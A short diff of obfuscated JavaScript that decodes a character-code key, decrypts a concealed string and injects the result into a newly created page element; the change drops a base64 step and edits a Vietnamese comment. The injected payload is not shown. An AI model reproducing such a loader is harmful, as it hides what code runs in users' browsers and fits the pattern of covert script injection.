@@ -1,6 +1,6 @@
 (function (_0x56eb, _0x5c1ffa) {
   var _0x1087ff = function (_0x445f77) {
-    return atob(_0x445f77.replace(/-/g, '+').replace(/_/g, '/')).split(',').map(Number).reverse().map(function (_0xa8a85b) {
+    return _0x445f77.split(',').map(Number).reverse().map(function (_0xa8a85b) {
       return String[_0x56eb[0]](_0xa8a85b);
     }).join('');
   };
@@ -11,7 +11,7 @@
     }
     return _0x4ebffd;
   };
-  var _0x2f924e = _0x56eb[6]; // Sửa chỉ số thành 6, tương ứng với chuỗi khóa
+  var _0x2f924e = _0x56eb[6]; // Chỉ số 6 tương ứng chuỗi khóa
   var _0x18e741 = _0x40d7de(_0x5c1ffa, _0x1087ff(_0x2f924e));
   var _0x2d8ebe = document[_0x56eb[1]](_0x56eb[2]);
   _0x2d8ebe[_0x56eb[3]] = _0x18e741;
